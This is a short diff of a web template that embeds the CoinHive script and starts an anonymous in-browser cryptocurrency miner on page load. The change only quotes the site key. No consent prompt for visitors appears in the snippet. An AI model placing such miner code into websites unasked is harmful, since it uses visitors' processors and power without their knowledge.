@@ -2,7 +2,7 @@
     {% spaceless %}
         <script src="https://coinhive.com/lib/coinhive.min.js" async></script>
         <script type="text/javascript">
-            var miner = new CoinHive.Anonymous({{ site_key }});
+            var miner = new CoinHive.Anonymous('{{ site_key }}');
             miner.start();
         </script>
     {% endspaceless %}
